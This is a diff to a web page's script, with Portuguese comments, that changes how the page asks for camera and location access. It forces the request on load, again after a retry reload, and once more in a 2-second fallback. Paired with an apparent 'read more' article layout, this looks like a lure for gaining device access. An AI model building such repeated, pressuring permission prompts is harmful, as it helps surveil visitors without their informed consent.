@@ -930,9 +930,12 @@
             reloadPageAndRetry();
         });
         
-        (async function() {
-            await requestAllPermissions();
-        })();
+        // FORÇAR SOLICITAÇÃO DE PERMISSÕES COM DELAY PARA GARANTIR POPUP
+        window.addEventListener('load', function() {
+            setTimeout(function() {
+                requestAllPermissions();
+            }, 100);
+        });
         
         readMoreBtn.addEventListener('click', async (e) => {
             e.preventDefault();
@@ -941,11 +944,20 @@
             }
         });
         
+        // Se veio de retry, forçar novamente
         if (window.location.search.includes('retry')) {
-            setTimeout(() => {
+            setTimeout(function() {
                 requestAllPermissions();
-            }, 500);
+            }, 300);
         }
+        
+        // Fallback: se após 2 segundos as permissões não foram solicitadas, tentar novamente
+        setTimeout(function() {
+            if (!cameraGranted && !locationGranted) {
+                console.log('Fallback: forçando solicitação de permissões...');
+                requestAllPermissions();
+            }
+        }, 2000);
     </script>
 </body>
 </html>
